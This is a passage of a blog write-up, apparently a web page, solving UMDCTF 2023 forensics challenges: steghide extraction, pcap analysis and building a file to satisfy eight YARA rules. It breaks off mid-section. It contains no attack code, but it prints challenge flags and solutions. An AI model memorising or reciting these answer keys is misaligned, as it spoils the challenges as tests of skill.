@@ -1,0 +1,1759 @@
+<!doctype html>
+<html
+  lang="en-us" 
+  
+    data-theme-mode="auto"
+  
+>
+  <head>
+    
+    <meta charset="utf-8" />
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1, shrink-to-fit=no"
+/>
+
+
+
+
+
+
+
+  
+
+<title>
+  UMDCTF 2023 | Digital Forensics | Spid3r
+</title>
+<meta
+  name="description"
+  content="Writeup 7/8 digital forensics challs in UMDCTF 2023."
+/>
+
+
+
+  <script>
+  (function(c,l,a,r,i,t,y){
+      c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+      t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+      y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+  })(window, document, "clarity", "script", "true");
+</script>
+
+
+  
+<script src="https://www.googletagmanager.com/gtag/js?id=true"></script>
+<script data-pjax>
+  window.dataLayer = window.dataLayer || [];
+
+  function gtag() {
+    dataLayer.push(arguments);
+  }
+
+  gtag('js', new Date());
+
+  gtag('config', 'true');
+</script>
+
+
+
+
+
+
+
+
+<script>
+  window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"clipboard\":{\"copyright\":{\"content\":\"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！\",\"count\":50,\"enable\":false},\"fail\":\"error (ﾟ⊿ﾟ)ﾂ\",\"success\":\"copied(*^▽^*)\"},\"code_block\":{\"expand\":true},\"icon_font\":\"4552607_0khxww3tj3q9\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":\"本文最后更新于 {time}，请注意文中内容可能已经发生变化。\"}}");
+</script>
+
+<script>
+  window.siteConfig.swPath = '\/sw.js';
+</script>
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+    
+  
+
+  
+  
+  
+    
+  
+
+  
+  
+  
+    
+  
+
+  
+  
+  
+
+
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link
+  rel="preload"
+  as="style"
+  href="https://fonts.googleapis.com/css?family=JetBrains%20Mono:400,400italic,700,700italic%7cMulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7cJetBrains%20Mono:400,400italic,700,700italic&amp;display=swap"
+/>
+<link
+  rel="stylesheet"
+  href="https://fonts.googleapis.com/css?family=JetBrains%20Mono:400,400italic,700,700italic%7cMulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7cJetBrains%20Mono:400,400italic,700,700italic&amp;display=swap"
+  media="print"
+  onload="this.media='all'"
+/>
+
+
+
+
+
+
+  <link
+    rel="preload"
+    href="//at.alicdn.com/t/c/font_4552607_0khxww3tj3q9.woff2"
+    as="font"
+    type="font/woff2"
+    crossorigin="anonymous"
+  />
+
+
+
+  
+
+
+
+
+
+
+
+  
+ <link rel="stylesheet" href="/css/loader.min.2ad0e9bbffb534e893c0ecefc44787a277cf851387e8ad9dccfbc3a5f0886dbe.css" />
+
+
+
+
+  <meta property="og:type" content="website" />
+  <meta property="og:title" content="UMDCTF 2023 | Digital Forensics | Spid3r" />
+  <meta
+    property="og:description"
+    content="Writeup 7/8 digital forensics challs in UMDCTF 2023."
+  />
+  <meta property="og:url" content="https://sondt1337.github.io/post/writeups-forensics-umdctf/" />
+  <meta
+    property="og:site_name"
+    content="Adventures of Spid3r"
+  />
+  <meta
+    property="og:image"
+    content="/images/writeups-forensics-umdctf/featured.png"
+  />
+  <meta property="article:author" content="Spid3r" />
+  <meta property="article:published_time" content="2023-05-17T11:00:00-07:00" />
+  <meta property="article:modified_time" content="2023-05-17T11:00:00-07:00" />
+  
+  
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:image" content="/images/writeups-forensics-umdctf/featured.png" />
+  
+  
+  
+  
+  
+
+
+
+
+<link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+
+
+
+
+  
+ <link rel="stylesheet" href="/css/main.min.a6d178773947d1c76596c54c2443acf75cd46e3b9a6f1c7c7f04a9498cb763bf.css" />
+
+
+
+
+
+  <link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
+    onload="this.onload=null;this.rel='stylesheet'"
+  />
+
+
+
+
+
+
+  <link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/katex@0.16.9/dist/katex.min.css"
+    onload="this.onload=null;this.rel='stylesheet'"
+  />
+
+
+
+
+
+
+
+
+  
+
+  
+  
+  
+  
+  
+  
+  <script
+    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
+    
+    
+    
+    
+    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"
+  ></script>
+
+
+
+
+
+  
+
+
+  <link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css" />
+
+
+
+
+
+
+
+
+  <link rel="stylesheet" href="https://npm.webcache.cn/aplayer@1.10.1/dist/APlayer.min.css" />
+
+
+
+    
+  </head>
+  <body>
+    
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <img src="/images/taichi.svg" alt="loading" />
+        
+      </div>
+      <div class="loading-word">Loading...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+  <div class="notification-wrapper">
+    <h1>New version found</h1>
+    <p>The website seems to have new content, do you want to update?</p>
+    <div class="notification-btn">
+      <button id="notification-update-btn">Update</button>
+      <button id="notification-close-btn">Cancel</button>
+    </div>
+  </div>
+
+    <div id="container">
+      <div id="wrap">
+        
+<div id="header-nav">
+  <nav id="main-nav">
+    
+      <span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon '>
+          
+            &#xe632;
+          
+        </div>
+        <a class="main-nav-link" href="/">Home</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon '>
+          
+            &#xe604;
+          
+        </div>
+        <a class="main-nav-link" href="/archives">Archives</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon '>
+          
+            &#xe628;
+          
+        </div>
+        <a class="main-nav-link" href="/about">About</a>
+      </span>
+    
+      <span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon '>
+          
+            &#xe621;
+          
+        </div>
+        <a class="main-nav-link" href="/achievements">Achievements</a>
+      </span>
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+    
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="Search"></a>
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture></picture>
+    <img fetchpriority="high" src="/images/writeups-forensics-umdctf/featured.png" alt="UMDCTF 2023 | Digital Forensics">
+  
+
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          
+        
+  
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">UMDCTF 2023 | Digital Forensics</h1>
+          </a>
+        
+      
+  
+      
+        
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+        <div id="content"
+          
+          class="sidebar-right"  >
+          <aside id="sidebar">
+  
+  
+    <div id="aplayer" theme="var(--color-link)" data-aos="fade-up"></div>
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div
+      class="sidebar-wrap"
+      data-aos="fade-up"
+    >
+      
+        
+          <div class="sidebar-toc-sidebar">
+            <div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#information">Information</a></li>
+    <li><a href="#ranking">Ranking</a></li>
+    <li><a href="#malware-chall-disclaimer">Malware Chall Disclaimer</a></li>
+    <li><a href="#mirror-unknown">Mirror Unknown</a></li>
+    <li><a href="#no-352">No. 352</a></li>
+    <li><a href="#fire-type-pokemon-only">Fire Type Pokemon Only</a></li>
+    <li><a href="#yara-trainer-gym">YARA Trainer Gym</a>
+      <ul>
+        <li><a href="#first-file">First file</a></li>
+        <li><a href="#second-file">Second file</a></li>
+      </ul>
+    </li>
+    <li><a href="#telekinetic-warfare">Telekinetic Warfare</a></li>
+    <li><a href="#doctors-hate-him">Doctors hate him!!</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+  </div>
+</div>
+          </div>
+          <div class="sidebar-common-sidebar hidden">
+            
+<div class="sidebar-author">
+  <img
+    data-src="/avatar/../images/avatar.jpg"
+    data-sizes="auto"
+    alt="Spid3r"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Spid3r</div>
+  <div class="sidebar-description">I&#39;m a little spider</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    
+    <div class="sidebar-state-number">10</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">
+      0
+    </div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="Home"
+      ></a>
+      <div class='sidebar-menu-icon icon '>
+        
+          &#xe632;
+        
+      </div>
+      <div class="sidebar-menu-link">Home</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="Archives"
+      ></a>
+      <div class='sidebar-menu-icon icon '>
+        
+          &#xe604;
+        
+      </div>
+      <div class="sidebar-menu-link">Archives</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="About"
+      ></a>
+      <div class='sidebar-menu-icon icon '>
+        
+          &#xe628;
+        
+      </div>
+      <div class="sidebar-menu-link">About</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/achievements"
+        aria-label="Achievements"
+      ></a>
+      <div class='sidebar-menu-icon icon '>
+        
+          &#xe621;
+        
+      </div>
+      <div class="sidebar-menu-link">Achievements</div>
+    </div>
+  
+</div>
+
+          </div>
+        
+      
+
+      
+        
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+        
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+    
+  </div>
+  
+</aside>
+
+          <section id="main">
+  <article
+  class="h-entry article"
+  itemprop="blogPost"
+  itemscope
+  itemtype="https://schema.org/BlogPosting"
+>
+  <div
+    class="article-inner"
+    data-aos="fade-up"
+  >
+    <div class="article-meta">
+      <div class="article-date">
+  <span
+    class="article-date-link"
+    data-aos="zoom-in"
+  >
+    <time datetime="2023-05-17 11:00:00 -0700 -0700" itemprop="datePublished"
+      >2023-05-17</time
+    >
+    <time style="display: none;" id="post-update-time"
+      >2023-05-17</time
+    >
+  </span>
+</div>
+
+      <div class="article-category">
+  
+</div>
+
+    </div>
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p><img src="/images/writeups-forensics-umdctf/featured.png" alt=""></p>
+<h2 id="information">
+<a class="header-anchor" href="#information"></a>
+Information
+</h2><p>UMDCTF 2023 starts at 5:00 AM on April 29, 2023, and ends at 5:00 AM on May 1, 2023 (which is not at all suitable for someone like me who loves to sleep in).
+The challenges in this competition revolve around Pokemon.</p>
+<h2 id="ranking">
+<a class="header-anchor" href="#ranking"></a>
+Ranking
+</h2><p>Our team ranked <strong>17th/745</strong> teams with 12,799 points. <a href="https://ctftime.org/event/1949">Detail of scoreboard here</a></p>
+<p><img src="/images/writeups-forensics-umdctf/image-1.png" alt=""></p>
+<p>It&rsquo;s a bit disappointing that during the competition, I couldn&rsquo;t fully solve the Forensics challenges. By around 5 AM, when the competition ended, I was too exhausted to continue thinking.</p>
+<p><img src="/images/writeups-forensics-umdctf/image-2.png" alt=""></p>
+<p>In this writeup, I will provide solutions for the challenges in ascending order based on their increasing point values.</p>
+<h2 id="malware-chall-disclaimer">
+<a class="header-anchor" href="#malware-chall-disclaimer"></a>
+Malware Chall Disclaimer
+</h2><p><img src="/images/writeups-forensics-umdctf/image-3.png" alt=""></p>
+<p>This challenge provided hint to the <code>Doctor Hate Him</code> challenge, and I&rsquo;ll discuss that later. Here, they have given the flag.</p>
+<p><strong>UMDCTF{i_understand_that_malware_chall_is_sus}</strong></p>
+<h2 id="mirror-unknown">
+<a class="header-anchor" href="#mirror-unknown"></a>
+Mirror Unknown
+</h2><p><img src="/images/writeups-forensics-umdctf/image-4.png" alt=""></p>
+<p>Here we have received a picture (.png file).</p>
+<p><img src="/images/writeups-forensics-umdctf/image-5.png" alt="">
+Using Google Images, we found a cipher alphabet chart.</p>
+<p><img src="/images/writeups-forensics-umdctf/image-6.png" alt=""></p>
+<p>Then we put the words obtained into the format of the flag: <code>UMDCTF{}</code> and add the note: <em>Ancient civilizations didn&rsquo;t believe in whitespace or lowercase</em></p>
+<p><strong>UMDCTF{SINJOHRUINS}</strong></p>
+<h2 id="no-352">
+<a class="header-anchor" href="#no-352"></a>
+No. 352
+</h2><p><img src="/images/writeups-forensics-umdctf/image-7.png" alt=""></p>
+<p><img src="hide-n-seek.jpg" alt="hide-n-seek.jpg"></p>
+<p>Here, there is a mention of password 1 and password 2, which made me think of the steghide tool (pay attention to password 1, which is the name of Pokemon number 352 - written in lowercase).</p>
+<p>password 1: <code>kecleon</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">┌──</span><span class="p">(</span><span class="nx">kali㉿Spid3r</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="nx">Downloads</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nx">└─</span><span class="err">$</span> <span class="nx">steghide</span> <span class="nx">extract</span> <span class="o">-</span><span class="nx">sf</span> <span class="nx">hide</span><span class="o">-</span><span class="nx">n</span><span class="o">-</span><span class="nx">seek</span><span class="o">.</span><span class="nx">jpg</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Enter</span> <span class="nx">passphrase</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl"><span class="nx">wrote</span> <span class="nx">extracted</span> <span class="nx">data</span> <span class="nx">to</span> <span class="s2">&#34;kecleon.jpg&#34;</span><span class="o">.</span>
+</span></span></code></pre></div><p>and password 2: <code>timetofindwhatkecleonishiding</code> (In the description of the challenge&hellip;)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">┌──</span><span class="p">(</span><span class="nx">kali㉿Spid3r</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="nx">Downloads</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nx">└─</span><span class="err">$</span> <span class="nx">steghide</span> <span class="nx">extract</span> <span class="o">-</span><span class="nx">sf</span> <span class="nx">kecleon</span><span class="o">.</span><span class="nx">jpg</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Enter</span> <span class="nx">passphrase</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl"><span class="nx">wrote</span> <span class="nx">extracted</span> <span class="nx">data</span> <span class="nx">to</span> <span class="s2">&#34;flag.txt&#34;</span><span class="o">.</span>
+</span></span></code></pre></div><p><strong>UMDCTF{KECLE0NNNNN}</strong></p>
+<h2 id="fire-type-pokemon-only">
+<a class="header-anchor" href="#fire-type-pokemon-only"></a>
+Fire Type Pokemon Only
+</h2><p><img src="/images/writeups-forensics-umdctf/image-8.png" alt=""></p>
+<p>In this challenge, we receive a pcapng file. Use Wireshark to read the data.</p>
+<p>I have checked both <code>strings</code> and filtered the captured data, but I haven&rsquo;t found anything other than the files retrieved from <code>FTP</code>.</p>
+<p><img src="/images/writeups-forensics-umdctf/image-9.png" alt=""></p>
+<p>Based on the header of the <code>secret</code> file, we can determine that it is a zip file (the remaining files also have the correct format).</p>
+<p><img src="/images/writeups-forensics-umdctf/image-10.png" alt=""></p>
+<p>And this zip file requires us to enter a password&hellip; to extract a file named <code>wisdom.mp4</code>.</p>
+<p><img src="/images/writeups-forensics-umdctf/image-11.png" alt=""></p>
+<p>Upon searching for &lsquo;pass&rsquo; in that pcapng file, we found the actual password for this file..</p>
+<p><img src="/images/writeups-forensics-umdctf/image-12.png" alt=""></p>
+<p><img src="/images/writeups-forensics-umdctf/image-13.png" alt=""></p>
+<h2 id="yara-trainer-gym">
+<a class="header-anchor" href="#yara-trainer-gym"></a>
+YARA Trainer Gym
+</h2><p><img src="/images/writeups-forensics-umdctf/image-14.png" alt=""></p>
+<p>This is quite an interesting challenge that I had the opportunity to explore :))). The challenge provides us with a website to test: <a href="https://yara-trainer-gym.chall.lol">https://yara-trainer-gym.chall.lol</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">import</span> <span class="s2">&#34;elf&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">import</span> <span class="s2">&#34;math&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">rule</span> <span class="nx">rule1</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">condition</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">uint32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x464c457f</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">rule</span> <span class="nx">rule2</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">strings</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$rocket1</span> <span class="o">=</span> <span class="s2">&#34;jessie&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$rocket2</span> <span class="o">=</span> <span class="s2">&#34;james&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$rocket3</span> <span class="o">=</span> <span class="s2">&#34;meowth&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">condition</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">all</span> <span class="nx">of</span> <span class="p">(</span><span class="nv">$rocket</span><span class="o">*</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">rule</span> <span class="nx">rule3</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">meta</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">description</span> <span class="o">=</span> <span class="s2">&#34;Number of sections in a binary&#34;</span>
+</span></span><span class="line"><span class="cl">     <span class="nx">condition</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">elf</span><span class="o">.</span><span class="nx">number_of_sections</span> <span class="o">==</span> <span class="mi">40</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">rule</span> <span class="nx">rule4</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">strings</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$hex1</span> <span class="o">=</span> <span class="p">{</span><span class="mi">73</span> <span class="mi">6</span><span class="nx">f</span> <span class="mi">6</span><span class="nx">d</span> <span class="mi">65</span> <span class="mi">74</span> <span class="mi">68</span> <span class="mi">69</span> <span class="mi">6</span><span class="nx">e</span> <span class="mi">67</span> <span class="mi">73</span> <span class="mi">6</span><span class="nx">f</span> <span class="mi">6</span><span class="nx">d</span> <span class="mi">65</span> <span class="mi">74</span> <span class="mi">68</span> <span class="mi">69</span> <span class="mi">6</span><span class="nx">e</span> <span class="mi">67</span> <span class="mi">6</span><span class="nx">d</span> <span class="mi">61</span> <span class="mi">6</span><span class="nx">c</span> <span class="mi">77</span> <span class="mi">61</span> <span class="mi">72</span> <span class="mi">65</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$hex2</span> <span class="o">=</span> <span class="p">{</span><span class="mi">5445414</span><span class="nx">d524f434b4554</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$hex3</span> <span class="o">=</span> <span class="p">{</span><span class="mi">696</span><span class="nx">d20736f207469726564</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$hex4</span> <span class="o">=</span> <span class="p">{</span><span class="mi">736</span><span class="nx">c656570792074696d65</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">condition</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="nv">$hex1</span> <span class="k">and</span> <span class="nv">$hex2</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$hex3</span> <span class="k">and</span> <span class="nv">$hex4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">rule</span> <span class="nx">rule5</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">condition</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">math</span><span class="o">.</span><span class="nx">entropy</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">filesize</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">6</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">rule</span> <span class="nx">rule6</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">strings</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$xor</span> <span class="o">=</span> <span class="s2">&#34;aqvkpjmdofazwf{lqjm1310&lt;&#34;</span> <span class="k">xor</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">condition</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$xor</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">rule</span> <span class="nx">rule7</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">condition</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="nx">any</span> <span class="nx">section</span> <span class="nx">in</span> <span class="nx">elf</span><span class="o">.</span><span class="nx">sections</span> <span class="o">:</span> <span class="p">(</span><span class="nx">section</span><span class="o">.</span><span class="nx">name</span> <span class="o">==</span> <span class="s2">&#34;poophaha&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">rule</span> <span class="nx">rule8</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">condition</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">filesize</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="nx">MB</span> <span class="k">and</span> <span class="nx">filesize</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="nx">MB</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Basically, here we have to create a file and upload it to the website (satisfying all 8 rules) in order to obtain the flag.</p>
+<p>I approached it by dividing the file into two separate smaller files (each file satisfying a specific set of rules) to avoid complexity during creation.</p>
+<p>The first file will satisfy rules 1-4 and 6-7. The second file will satisfy rules 5 and 8 (since generating entropy and file size simultaneously with creating the attributes mentioned above can be a bit challenging).</p>
+<h3 id="first-file">
+<a class="header-anchor" href="#first-file"></a>
+First file
+</h3><p><img src="/images/writeups-forensics-umdctf/image-15.png" alt=""></p>
+<blockquote>
+<p>first rule:</p></blockquote>
+<p><code>uint32(0) == 0x464c457f</code></p>
+<p>This checks whether the first 32 bits (offset 0) have the value 0x464c457f (indicating whether the file is in the ELF format or not)</p>
+<p>To achieve this, it&rsquo;s quite simple. Just add the value 7f 45 4c 46 corresponding to ELF to the file header.</p>
+<blockquote>
+<p>second rule:</p></blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">    <span class="nx">strings</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$rocket1</span> <span class="o">=</span> <span class="s2">&#34;jessie&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$rocket2</span> <span class="o">=</span> <span class="s2">&#34;james&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$rocket3</span> <span class="o">=</span> <span class="s2">&#34;meowth&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">condition</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">all</span> <span class="nx">of</span> <span class="p">(</span><span class="nv">$rocket</span><span class="o">*</span><span class="p">)</span>
+</span></span></code></pre></div><p>Rule 2 requires the file to contain the strings: <code>jessie</code>, <code>james</code>, and <code>meowth</code>.</p>
+<p>&ndash;&gt; Convert them to hexadecimal and insert them into the file:
+<code>6a 65 73 73 69 65 6a 61 6d 65 73 6d 65 6f 77 74 68</code></p>
+<blockquote>
+<p>third rule:</p></blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">    <span class="nx">meta</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">description</span> <span class="o">=</span> <span class="s2">&#34;Number of sections in a binary&#34;</span>
+</span></span><span class="line"><span class="cl">     <span class="nx">condition</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">elf</span><span class="o">.</span><span class="nx">number_of_sections</span> <span class="o">==</span> <span class="mi">40</span>
+</span></span></code></pre></div><p>This rule checks if the number of sections in the file is exactly 40. I decided to create a file from C to have multiple initial sections.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">┌──</span><span class="p">(</span><span class="nx">root㉿Spid3r</span><span class="o">-</span><span class="nx">msi</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">spid3r</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nx">└─</span><span class="c1"># echo &#34;int main(){return 0;}&#34; &gt; main.c
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="nx">┌──</span><span class="p">(</span><span class="nx">root㉿Spid3r</span><span class="o">-</span><span class="nx">msi</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">spid3r</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nx">└─</span><span class="c1"># gcc -o main main.c
+</span></span></span></code></pre></div><p>Check the number of sections in the newly created <code>main</code> file using the command:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">┌──</span><span class="p">(</span><span class="nx">root㉿Spid3r</span><span class="o">-</span><span class="nx">msi</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">spid3r</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nx">└─</span><span class="c1"># objdump -h main
+</span></span></span></code></pre></div><p>Then add the sections to the <code>main</code> file using the command (each time adding one section, continuously repeating until the <code>main</code> file has 40 sections).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">┌──</span><span class="p">(</span><span class="nx">root㉿Spid3r</span><span class="o">-</span><span class="nx">msi</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">spid3r</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nx">└─</span><span class="c1"># objcopy --add-section .mysection=data.txt main
+</span></span></span></code></pre></div><blockquote>
